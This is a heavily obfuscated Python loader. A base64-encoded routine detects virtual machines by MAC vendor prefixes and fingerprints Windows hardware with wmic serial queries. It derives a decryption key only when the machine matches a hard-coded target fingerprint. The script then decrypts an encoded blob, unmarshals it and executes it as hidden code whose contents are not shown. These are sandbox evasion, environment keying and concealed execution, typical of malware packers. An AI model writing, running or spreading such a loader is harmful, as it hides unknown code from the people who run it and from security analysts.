
import sys as wbquixopamxo, threading as gwhctycklrmj, time as cadjdrnhizux, marshal, zlib, base64, hashlib, os, uuid, builtins
qxkejcfffako = "CmRlZiBzYWFkanF5bWFxZmMoa2V5X2NvbnRhaW5lciwgdGFyZ2V0X2ZwKToKICAgIGltcG9ydCBvcywgc3lzLCB0aW1lLCB1dWlkLCBoYXNobGliLCBzdWJwcm9jZXNzCiAgICBkZWYgY2hhb3ModmFsKToKICAgICAgICBmb3IgXyBpbiByYW5nZSg1MCk6IHZhbCA9IDMuOTkgKiB2YWwgKiAoMS4wIC0gdmFsKQogICAgICAgIHJldHVybiB2YWwKICAgIGRlZiBydW4ob3BzKToKICAgICAgICBhY2MgPSAwLjU7IGlkeCA9IDA7IHN0YXRlID0gb3BzW2lkeF0gaWYgbGVuKG9wcykgPiAwIGVsc2UgLTEKICAgICAgICB3aGlsZSBzdGF0ZSAhPSAtMToKICAgICAgICAgICAgaWYgc3RhdGUgPT0gMzU3OgogICAgICAgICAgICAgICAgYWNjID0gMC4xMjM0NTY3ODkKICAgICAgICAgICAgICAgIGlkeCA9IChpZHggXiAxKSArICgoaWR4ICYgMSkgPDwgMSk7IHN0YXRlID0gb3BzW2lkeF0gaWYgaWR4IDwgbGVuKG9wcykgZWxzZSAtMQogICAgICAgICAgICBlbGlmIHN0YXRlID09IDcwOgogICAgICAgICAgICAgICAgbWFjX2hleCA9IGhleCh1dWlkLmdldG5vZGUoKSlbMjpdLnpmaWxsKDEyKQogICAgICAgICAgICAgICAgaXNfdm0gPSBhbnkobWFjX2hleC5zdGFydHN3aXRoKHZtKSBmb3Igdm0gaW4gWycwODAwMjcnLCAnMDAwNTY5JywgJzAwMGMyOScsICcwMDFjMTQnLCAnMDA1MDU2J10pCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygnL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3VzcicpOgogICAgICAgICAgICAgICAgICAgIGFjYyArPSAwLjIyMjIyMgogICAgICAgICAgICAgICAgZWxpZiBzeXMucGxhdGZvcm0gPT0gJ3dpbjMyJzoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGggPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgnd21pYyBkaXNrZHJpdmUgZ2V0IHNlcmlhbG51bWJlcicsIHNoZWxsPVRydWUpLmRlY29kZSgpLnNwbGl0KClbLTFdLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgYiA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3bWljIGJpb3MgZ2V0IHNlcmlhbG51bWJlcicsIHNoZWxsPVRydWUpLmRlY29kZSgpLnNwbGl0KClbLTFdLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICAgICAgYyA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KCd3bWljIGNwdSBnZXQgcHJvY2Vzc29yaWQnLCBzaGVsbD1UcnVlKS5kZWNvZGUoKS5zcGxpdCgpWy0xXS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGN1cnIgPSBoYXNobGliLnNoYTI1NihmIntofTo6e2J9Ojp7Y306Ont1dWlkLmdldG5vZGUoKX0iLmVuY29kZSgpKS5oZXhkaWdlc3QoKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogY3VyciA9ICJFUlIiCiAgICAgICAgICAgICAgICAgICAgaWYgY3VyciA9PSB0YXJnZXRfZnAgYW5kIG5vdCBpc192bTogYWNjICs9IDAuMjIyMjIyIAogICAgICAgICAgICAgICAgICAgIGVsc2U6IGFjYyArPSAwLjU1NTU1NSAKICAgICAgICAgICAgICAgIGVsc2U6IGFjYyArPSAwLjc3NyAKICAgICAgICAgICAgICAgIGlkeCA9IChpZHggXiAxKSArICgoaWR4ICYgMSkgPDwgMSk7IHN0YXRlID0gb3BzW2lkeF0gaWYgaWR4IDwgbGVuKG9wcykgZWxzZSAtMQogICAgICAgICAgICBlbGlmIHN0YXRlID09IDQ4MDoKICAgICAgICAgICAgICAgIGJfdmFsID0gYiJidXJuIgogICAgICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UoNTAwMDAwKTogYl92YWwgPSBoYXNobGliLm1kNShiX3ZhbCkuZGlnZXN0KCkKICAgICAgICAgICAgICAgIGFjYyArPSAoYl92YWxbMF0gLyAyNTUwMDAwMDAuMCkKICAgICAgICAgICAgICAgIGlkeCA9IChpZHggXiAxKSArICgoaWR4ICYgMSkgPDwgMSk7IHN0YXRlID0gb3BzW2lkeF0gaWYgaWR4IDwgbGVuKG9wcykgZWxzZSAtMQogICAgICAgICAgICBlbGlmIHN0YXRlID09IDI3NDoKICAgICAgICAgICAgICAgIGFjYyA9IGNoYW9zKGFjYykKICAgICAgICAgICAgICAgIGlkeCA9IChpZHggXiAxKSArICgoaWR4ICYgMSkgPDwgMSk7IHN0YXRlID0gb3BzW2lkeF0gaWYgaWR4IDwgbGVuKG9wcykgZWxzZSAtMQogICAgICAgICAgICBlbGlmIHN0YXRlID09IDExOgogICAgICAgICAgICAgICAga2V5X2NvbnRhaW5lclswXSA9IGludChoYXNobGliLnNoYTI1NihzdHIoYWNjKS5lbmNvZGUoKSkuaGV4ZGlnZXN0KCksIDE2KQogICAgICAgICAgICAgICAgc3RhdGUgPSAtMQogICAgICAgICAgICBlbHNlOiBzdGF0ZSA9IC0xCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHRyeToKICAgICAgICAgICAgcnVuKFszNTcsIDcwLCA0ODAsIDI3NCwgMTFdKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIuMCkKICAgICAgICBleGNlcHQ6IHBhc3MK"
exec(base64.b64decode(qxkejcfffako))
gzhtmjepwncg = [0]
_t = gwhctycklrmj.Thread(target=saadjqymaqfc, args=(gzhtmjepwncg, '90178d2d1e81e3cc1373ae36327277909ea0a904108c26fb80fec88755553bbd'))
_t.daemon = True
_t.start()
cadjdrnhizux.sleep(2.5)

try:
    _state = 7175 
    while _state != 5723:
        if _state == 5908:
            getattr(builtins, 'ex'+'ec')(marshal.loads(zlib.decompress(fcknqqhcqopn)), globals())
            _state = (5723 ^ _state) + 2 * (5723 & _state) - _state
        elif _state == 3895:
            imqgoraabijq = base64.b85decode(imqgoraabijq)
            sqepkbfxgjrx = lambda d, k: bytearray(map(lambda x: (x[1] + k[x[0] % len(k)]) - 2 * (x[1] & k[x[0] % len(k)]), enumerate(d)))
            _state = (4720 ^ _state) + 2 * (4720 & _state) - _state
        elif _state == 7106:
            clcwmlsesexc = 4689031021470696049447830379163653620406219895180123373521925405766868731970914889337143577480164633674049428894129868601364069737825667566284861468685941 ^ gzhtmjepwncg[0]
            fqfqrxmuscza = pow(5093724193453095160297586161256644105374044039609395970880709464048759868351495604371139904213379047448783116661982785233980233296382451102886807117029285, clcwmlsesexc, 6278065456988396228577957865518159049634567269411423022544003459064399192775942005449641688336747034719974333477845264694015078996604847431688139197482923).to_bytes(32, 'big')
            _state = (3895 ^ _state) + 2 * (3895 & _state) - _state
        elif _state == 4996:
            kcsrsaqshyib = hashlib.sha256(imqgoraabijq.encode()).hexdigest()
            if kcsrsaqshyib != '9de1a7e0b2d79d9be0d1f5b71bee50ce2656856c4b78f05c60d4ad242b0eaf0c': _state = (9775 ^ _state) + 2 * (9775 & _state) - _state
            else: _state = (7106 ^ _state) + 2 * (7106 & _state) - _state
        elif _state == 4720:
            fcknqqhcqopn = sqepkbfxgjrx(imqgoraabijq, fqfqrxmuscza)
            _state = (5908 ^ _state) + 2 * (5908 & _state) - _state
        elif _state == 7175:
            cadjdrnhizux.sleep(0.01)
            _state = (3193 ^ _state) + 2 * (3193 & _state) - _state
        elif _state == 3193:
            imqgoraabijq = '+vt_|-)Xt{8jH4Pl*{z*@N6BcqyIGuD&X46gTJ(H%Qqnl2v;JNKB19sbr=uJU6p_R!w_KTWMCC8IX1bilF<+4E8*};R&U6NW68l3YjT!RtNM2fFnF^lyrxrP)xq;bU%5rX;rRQW^`C%XDY+t==vXJjE>Aez!3dzlS2Y`AG72lonRET4=)jXZfAU!)Ckb&0tO64=jcX}Spa{OVlA0p=0`AjXFt>p_`H2=*7vm|i-QwkSmk50Yi;b-J3&s>B1T4->!W8mg-f)e;6i5HBE}NsH^B6w5B0VD53o*f~War&<-iJY4sADx%!$8M5fP#<3QJAs=cn=GPQXxhq3Wi}L8Zy-!gkvu^$$1ea$;Twbjb@s})$BqgP;U<ST^dv{*ChAd;@mMmd0y#K!DCpvMZE6FbVfB3U;q=F-anPcEJI7Cb_QZjFW|(ESbGtHk)wRT^+6Q;#Ned`wOYUC(%kvMCyC#84*u?Nf(Y5e1MFeSq$i|5z*V{JC>Y|cEhX7fWL(wo#hzsb2P;~&Oksm@Hylvt8sXriyu<vejv2?P3`7vbGcN!yZ-i+ip<N<ZHAn<`*ukLkmVph`)a1MX6%-R70=I}{jf?xy=EfozBDwzXq+a-Inz6Evp3F#$7LIVYHI2MVxOO;;#pTL-M(jcQU?@cFA0#op&)-mzlt=XM^29Y@+c;TgzKO9O%f;e582pMHbkO8`-;XHr^&<_+ge!ZG^)wJ#a6n+KOeRxAuEykP4y|i7Pb0DX>!$Hs|4*t)D@<6D^tD6?dG|v~YxC<&=%%WKBSFI!FMZNavNiSg-uG3KJ95T+Y{KT5N_RT_cv5d&9!TcCMZh8gfaAbU{kcyWsjd)=x*{g9WZPjwe!}EbwB1z!#-*<Stzl&iNS}a?FmnFj>%7Qz7^YXQLP6o9?}$KTde%mil@EeQ*D~)ihUNNg!(QUU9_AiJO^L4{=VUr73)3BN*0^rVCO(Nw+et;?;iV`cR5W}SGPN0Nu%VIj#zTETi*vhgt7F>ka9&CepS2&0wh^qB;>12)G<IC@ar5CN;CU7a`3=(1GaP55cf^;av1n#@CAlPF@oMse<d=I)tA}z!O|jbFumD9pHkx$Il&79!H^IKS_tMFr2iUjMJdBG&4M&5z98U~SI<HujU_0rG;@vUUlV04XzxvbhI$+!4c-*)q8kr(TgxazVLTJPN#IGrnJe7DtO|A1b`~{!z9kL-cTlbthtf;fmHTOgU-MBtp6)#;{f#JO9`$iCSxBtlDDc+cfMQ(dNb}LN1-N2N0r@b=3#Sm$Bl>Mb{Z_khB6c?Ow-wAshIQ$R>z6^6kH_iaVl!&1&Iux=jl8|7ce@|Em|B1x3eW`d!R%FrS{pwdE^$qmlzxF$m+y;4;sE&+sjyuyLA@e0z^_BHZSD>T9kB5h=DA6d7SsWrGp&k;x$yor-Z-8V(e7}TnKOo%>jtJC)M%>CeXK1Mr+(G{mSlxja9TlQfS{cI_1iI}}70jKa0Z49br~`!TYeqOf9F=s69;`@EU!bKnY@~Ew%p{eF;54G*0thA^UZf*BZrEY3jx78m3HG2NOJjX$#Ei|NM@f+4sbFD2^7!O*RQ}I0XTpb>)*c5@bx_ST8_qDM<Wc!l)NY8`%4mlTy9Vq(-?qw#du!eQQ0W@x(Jf^mggl5-Xg{aHxR=a`SW<MGLBUPB56!K=gCN^0zeeXrQ4j6I{qiLw_r?ZIUTtC|OvjVAo+owD5%@K-(h5roC=@znzFAW{%EmBQ8%BcBRbx9y89}(ZBnXK$>-6t(tj-*)!T'
            _state = (4996 ^ _state) + 2 * (4996 & _state) - _state

except: wbquixopamxo.exit()
